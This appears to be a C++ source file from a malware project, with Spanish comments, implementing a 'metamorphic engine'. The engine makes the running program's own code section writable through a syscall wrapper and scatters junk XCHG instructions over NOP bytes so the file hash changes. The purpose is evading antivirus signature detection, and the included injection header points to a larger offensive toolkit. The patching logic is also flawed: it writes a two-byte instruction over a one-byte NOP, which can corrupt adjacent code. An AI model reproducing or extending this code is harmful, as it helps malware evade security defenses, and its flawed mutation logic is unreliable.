#include "MetamorphicEngine.h"
#include "../Injection/SyscallWrapper.h"
#include <random>

bool MetamorphicEngine::MutateSelf() {
    HMODULE hModule = GetModuleHandleA(NULL); // Obtener base del ejecutable actual
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    // Localizar la sección de código (.text)
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    PVOID codeBase = (BYTE*)hModule + section->VirtualAddress;
    SIZE_T codeSize = section->SizeOfRawData;

    // 1. Cambiar permisos de la memoria para poder escribir en nuestra propia sección de código
    ULONG oldProtect;
    NTSTATUS status = SafeNtProtectVirtualMemory(
        GetCurrentProcess(), 
        &codeBase, 
        &codeSize, 
        PAGE_EXECUTE_READWRITE, 
        &oldProtect
    );

    if (status != 0) return false;

    // 2. Inyectar ruido lógico (instrucciones que no hacen nada pero cambian el hash)
    InjectLogicalNoise(codeBase, codeSize);

    // 3. Restaurar permisos originales
    SafeNtProtectVirtualMemory(
        GetCurrentProcess(), 
        &codeBase, 
        &codeSize, 
        oldProtect, 
        &oldProtect
    );

    return true;
}

void MetamorphicEngine::InjectLogicalNoise(PVOID address, SIZE_T size) {
    BYTE* data = (BYTE*)address;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, size - 10);

    // Insertar pequeñas mutaciones en espacios muertos del binario
    for (int i = 0; i < 50; i++) {
        int pos = dist(gen);
        // Evitar sobreescribir instrucciones críticas, buscamos alineaciones de NOPs
        if (data[pos] == 0x90) { 
            data[pos] = 0x87; // XCHG
            data[pos+1] = 0xDB; // EBX, EBX (operación neutra)
        }
    }
}